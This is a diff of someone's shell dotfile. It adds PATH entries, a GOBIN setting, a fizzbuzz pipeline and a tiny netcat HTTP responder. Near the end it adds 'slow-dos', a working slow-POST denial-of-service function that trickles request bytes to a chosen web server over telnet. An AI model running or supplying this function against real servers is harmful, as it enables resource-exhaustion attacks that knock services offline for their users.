@@ -158,6 +158,7 @@ __add_path "$HOME/.cabal/bin"
 __add_path "$HOME/.composer/vendor/bin"
 __add_path "$HOME/.egison/bin"
 __add_path "/usr/games" # For Ubuntu
+__add_path "/usr/local/sbin"
 # __add_path "/usr/local/opt/icu4c/bin"
 # __add_path "/usr/local/opt/icu4c/sbin"
 
@@ -167,6 +168,7 @@ __add_path "/usr/games" # For Ubuntu
 _target_path="$HOME/.go"
 if [ -e "$_target_path" ]; then
   export GOPATH="$_target_path"
+  export GOBIN="$_target_path/bin"
   export PATH=$GOPATH/bin:$PATH
 fi
 
@@ -645,6 +647,7 @@ str2ncrhex () {
 # String to Unicode Escapse Sequence
 str2ues () {
   nkf -w16B0 | od -tx1 -An | tr -dc '[:alnum:]' | fold -w 4 | sed 's/^/\\u/g' | tr -d '\n' | awk 1
+  # nkf -w16B0
 }
 
 # Example
@@ -746,6 +749,10 @@ primes() {
       _factor="factor"
   fi
   yes | awk '$0=NR+1' | $_factor | awk '$0*=!$3'
+}
+
+fizzbuzz() {
+  yes | awk '{print NR}' | sed '0~3s/.*/Fizz/;0~5s/$/Buzz/' | sed 's/[0-9]*B/B/'
 }
 
 answer_is () {
@@ -953,4 +960,24 @@ train-kanto () {
     tr -d -- '- ' |
     awk NF=NF |
     xargs -n 2
+}
+
+slow-dos () {
+  local _fqdn="$1"
+  local _domain_port=$(awk -F'/' '{print $1}' <<<"$_fqdn")
+  local _domain=$(awk -F':' '{print $1}' <<<"$_domain_port")
+  local _port=$(awk -F':' '{print $2}' <<<"$_domain_port" | grep -oE '[0-9]*')
+  local _request_path=$(grep -oE '/.*$' <<<"$_fqdn")
+  local _clength=${2:-10}
+  _request_path=${_request_path:-/}
+  _port=${_port:-80}
+  echo "_fqdn $_fqdn"
+  echo "_domain $_domain"
+  echo "_request_path ${_request_path}"
+  echo "_port ${_port}"
+  (sleep 1; echo -ne "POST $_request_path HTTP/1.1\nHost: $_domain\nContent-Length: $_clength\n\n"; yes 'printf a; sleep 1;' | sh ) | telnet "$_domain" "$_port"
+}
+
+nc-200 () {
+  ( echo "HTTP/1.1 200 Ok"; echo; printf "$1" ) | nc -l 8080
 }
